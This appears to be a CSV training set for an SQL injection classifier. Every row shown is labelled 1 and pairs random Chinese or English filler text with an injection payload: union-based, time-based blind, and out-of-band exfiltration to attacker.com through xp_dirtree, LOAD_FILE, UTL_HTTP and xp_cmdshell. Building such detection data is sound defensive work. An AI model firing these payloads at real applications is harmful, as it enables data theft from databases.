content,label
"product 360 ' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",1
"多少钱 ' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",1
"间各先低总置内增时' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",1
"素里米设再后反斯消极' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",1
"warning 2024 ' OR 1=1 UNION SELECT 1,2,3 FROM users WHERE '1'='1'--",1
"怎么样 ' AND IF(1=1,SLEEP(5),0)--",1
"哪里买 error 63 ' AND IF(1=1,SLEEP(5),0)--",1
"prq7kvrgv@' AND IF(1=1,SLEEP(5),0)--",1
"严如个色定量京也引会对问' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",1
"哪里买 ' UNION SELECT 1,2 WHERE ASCII(SUBSTRING((SELECT DATABASE()),1,1))>65--",1
"参务确持意十极如色红长' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",1
"bkh3h4@' AND 1=IF((SELECT DATABASE())='test_db',SLEEP(10),0)--",1
"我民工求属物来始' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",1
"历表计厂' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",1
"error 怎么样 ' OR IF(EXISTS(SELECT 1 FROM users WHERE username='admin'), SLEEP(5), 0)--",1
推荐 '; EXEC xp_fileexist '\\attacker.com\check'--,1
9d8gau@'; EXEC xp_fileexist '\\attacker.com\check'--,1
z0tmh@'; EXEC xp_fileexist '\\attacker.com\check'--,1
08lm9s5@'; EXEC xp_fileexist '\\attacker.com\check'--,1
system 784 '; EXEC master..xp_dirtree '\\attacker.com\leak'--,1
功能 profile '; EXEC master..xp_dirtree '\\attacker.com\leak'--,1
委农来包土领出亲型'; EXEC master..xp_dirtree '\\attacker.com\leak'--,1
rct1f@'; EXEC master..xp_dirtree '\\attacker.com\leak'--,1
"哪里买 item ' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
"6jpfu@' UNION SELECT IF(1=1,LOAD_FILE('\\attacker.com\file'),NULL)--",1
共华变海史流北中即问'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,1
snna9qwpy@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,1
议火面心要说方度工原更年总易山'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,1
hpfzdmyiy7@'; DECLARE @cmd NVARCHAR(4000); SET @cmd='ping attacker.com'; EXEC(@cmd);--,1
"data 2024 ' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",1
"南党压有江例战重更' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",1
"声此满关强共' UNION SELECT 1,2 WHERE LOAD_FILE('\\attacker.com\leak')--",1
"product 价格 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"排名 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"bsczrqmfdg@' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
"server 817 ' UNION SELECT 1,2 FROM users WHERE username='admin' AND SLEEP(10);--",1
推荐 order 33 '; exec master..xp_dirtree '\\attacker.com\share'--,1
8k1mbo3nmn@'; exec master..xp_dirtree '\\attacker.com\share'--,1
内思群红收'; exec master..xp_dirtree '\\attacker.com\share'--,1
7yf0po@'; exec master..xp_dirtree '\\attacker.com\share'--,1
"形为做于王消行格品她并单深将更' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"vfp9akeys29@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"tqasxl@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"zyw3i5@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"什么是 login ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
使用方法 table 97 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
如何 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
1fiwst@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
价格 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"account 推荐 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"il1exn@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"nu573s@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"下载 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"32m58s4vacw4@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"ffougc4qr@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"dpvkbyp4rrxg@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"warning 155 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"login 如何 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"声此就出管年要县写和认必才当' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"什么是 password 65 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
r6y0h7vza@'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
k90fu095h2gr@'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
fail 243 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
profile 什么是 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
影就保习选非设用值其般管团单'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"page 最新 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"教程 item ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"优势 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"fujyq1m@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"多少钱 server 85 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"铁样布毛标百量立先米专须' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"login 下载 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"地于律来思感调起会叫没研四改' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
多华米始深众大点在人省领什' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
然清向如新工数证东器' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
w3t98@' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
使用方法 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
profile 哪里买 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
性该意京就列' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
特点 search 94 '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
是么交般路观整理选近华习更车'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
7bxid0047a@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
商头下名积管群步达书'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
vk3zb31il@'; exec master..xp_fileexist '\\attacker.com\test'--,1
如何 '; exec master..xp_fileexist '\\attacker.com\test'--,1
区矿术转织'; exec master..xp_fileexist '\\attacker.com\test'--,1
下载 '; exec master..xp_fileexist '\\attacker.com\test'--,1
好不好 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
怎么样 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
最新 success ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
qk5u109g5@' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"vio0bwfnwgun@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"wcm7h2@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"好不好 data ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
success 功能 '; exec master..xp_dirtree '\\attacker.com\share'--,1
最新 admin 57 '; exec master..xp_dirtree '\\attacker.com\share'--,1
排名 error '; exec master..xp_dirtree '\\attacker.com\share'--,1
warning 对比 '; exec master..xp_dirtree '\\attacker.com\share'--,1
下载 '; exec master..xp_dirtree '\\attacker.com\share'--,1
"item 492 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"以就领近解严使部山' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"五议论应步效向路标任林此色存' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
profile 176 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
复面信非造化文已相' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
哪里买 login ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
计比造南真本拉单非派' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
profile 315 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"ta6z3v2sbt@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"率场压划千情内林术响论海般容' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"权总议设收件京因身新维半' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"对比 account 65 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"下载 search 14 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"2024 product 20 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"最新 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"好不好 server ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"引级所铁支十任值它花精产东' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"怎么样 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"价格 setting ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"资证江特且长研圆名之多文只条' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
道长或即证'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
table 260 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
如何 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
ur4ss@'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"样将流按林界深四根结' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"整建因空问清' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"view 哪里买 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"hehup@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"每你使按几于民日面角六' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"admin 324 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"d6pmwge@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"思质小天百度军地除存五美支青' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
item 531 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
什么是 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
data 哪里买 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
评测 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
价格 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
2024 user 59 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
ak5yunrjr@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
0whpfj09nax@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
mt558bdjf@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
哪里买 '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
em3i9lp9l9@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
太小来集此'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
气变须织打示家习层律你定'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
易进解山什带'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
连决又西和值处'; exec master..xp_fileexist '\\attacker.com\test'--,1
积求及林律西工算有有动少走'; exec master..xp_fileexist '\\attacker.com\test'--,1
哪里买 '; exec master..xp_fileexist '\\attacker.com\test'--,1
优势 login 43 '; exec master..xp_fileexist '\\attacker.com\test'--,1
怎么样 user 51 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
特点 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
评测 page 82 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"优势 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"table 怎么样 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"县细十却并展候量利身争方或通' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"业计边得合温众亲类林' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"流何行此决何置身应单权实马' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
劳展算不却没接美自重形'; exec master..xp_dirtree '\\attacker.com\share'--,1
积劳业县四常开听压回立或高交六'; exec master..xp_dirtree '\\attacker.com\share'--,1
华样效状种利合水化式自战后为称'; exec master..xp_dirtree '\\attacker.com\share'--,1
"价格 login ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"user 功能 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"jmizbi@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"最新 error 43 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
好不好 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
xdgelo0mu@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
下载 item 58 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"想以存用统支集持' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"特点 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"使用方法 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"p8jed25qg7h@' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"好不好 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"功能 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"价格 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"怎么样 setting ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"教程 warning 53 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"推荐 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"table 588 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
login 哪里买 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
特点 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
如何 error 79 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
profile 515 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"l8uw9z36v@' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"upnxjtyxn7@' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"search 哪里买 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"价格 order ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"优势 ' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"切较入省共老写清构干十支' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
使用方法 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
低办须式改适构系又象' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
又件条的量这别引究放力容' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
干条铁号正着机天群族需示' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
怎么样 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
最新 password 32 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
wbtg6ojxnum@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
c5mbr0f5b@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
system 优势 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
qlhpx@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
xid37hzc@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
优势 warning '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
织无者压品'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
哪里买 warning '; exec master..xp_fileexist '\\attacker.com\test'--,1
青后化点导据历据所重称议的片'; exec master..xp_fileexist '\\attacker.com\test'--,1
warning 715 '; exec master..xp_fileexist '\\attacker.com\test'--,1
test 多少钱 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
优势 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
土资力受所响' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"多少钱 test ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"fail 价格 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"特点 login ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"search 什么是 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
哪里买 '; exec master..xp_dirtree '\\attacker.com\share'--,1
好不好 data '; exec master..xp_dirtree '\\attacker.com\share'--,1
login 500 '; exec master..xp_dirtree '\\attacker.com\share'--,1
"光何力身头或商' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"下载 warning ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"如何 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"success 怎么样 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"使用方法 user ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
lhgi8u4gin4v@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
table 如何 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
8we57v@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
password 620 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"评测 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"无一手连验养空叫阶名' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"哪里买 user ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"好不好 admin 63 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"1qrnl8m3693@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"好不好 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"推荐 page 14 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"rk2urb7x0m@' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"admin 教程 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"osloey7dz@' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"山存群更二活学老压产建己' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
许个建知期包'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
同书认斗'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
特点 product 57 '; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
"如何 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"order 教程 ' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"式际己各向没治空' UNION SELECT NULL,NULL,NULL WHERE 1=EXPLODE('\attacker.com\file')--",1
"arn7zikst4q@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"ezyh7xhbfkso@' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"包非是建置位' UNION SELECT NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
委或风少组想精场水后须油' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
2024 ' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
权何称确者直县段越总且离群及九' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
织习强近等且段回作走断' AND UTL_HTTP.REQUEST('http://attacker.com/log')--,1
9c3120pqu@' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
功能 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
下载 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
大第点按下他证基少后' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
2024 ' UNION SELECT 1 INTO OUTFILE '\\attacker.com\share'--,1
tyurungs@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
功能 '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
特点 '; EXEC('xp_cmdshell ''ping attacker.com''')--,1
937fh@'; EXEC('xp_cmdshell ''ping attacker.com''')--,1
优势 '; exec master..xp_fileexist '\\attacker.com\test'--,1
功能 '; exec master..xp_fileexist '\\attacker.com\test'--,1
如何 system 64 '; exec master..xp_fileexist '\\attacker.com\test'--,1
3j15yg7c@'; exec master..xp_fileexist '\\attacker.com\test'--,1
政解规米社六细意选使面北集'; exec master..xp_fileexist '\\attacker.com\test'--,1
admin 怎么样 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
把目太自并做些年象型毛是小联解' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
功能 ' AND (SELECT NULL FROM dual WHERE 1=LOAD_FILE('\\attacker.com\share'))--,1
"如何 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"推荐 user 38 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"哪里买 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
"功能 ' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\test'--",1
3fqyi@'; exec master..xp_dirtree '\\attacker.com\share'--,1
评测 profile '; exec master..xp_dirtree '\\attacker.com\share'--,1
价格 success '; exec master..xp_dirtree '\\attacker.com\share'--,1
"szq5ibmze@' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"对比 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"data 455 ' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"断引对全从本在需北何' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
"论便社力传向书石适传' UNION SELECT 1, LOAD_FILE('\\attacker.com\share')--",1
最新 product 39 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
劳下任场' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
47lna@' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
password 对比 ' AND UTL_INADDR.GET_HOST_ADDRESS('attacker.com')--,1
"推荐 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"下载 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"怎么样 ' AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT DATABASE()), '.attacker.com\log')))--",1
"03915hp3@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"3a45v@' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"界产方几色我维积知五引二队安世' UNION SELECT NULL,NULL,NULL INTO OUTFILE '\\attacker.com\file'--",1
"server 771 ' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"消身王道明动手传力一' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
"ag8lz11r@' AND (SELECT EXTRACTVALUE(NULL, CONCAT(0x5c5c, (SELECT DATABASE()), '.attacker.com\log')))--",1
阶度人例状而选作'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
s27uoukdq@'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
清真百级儿海置角'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
干三片易分'; DECLARE @q varchar(8000); SET @q='\attacker.com\share'; EXEC(@q);--,1
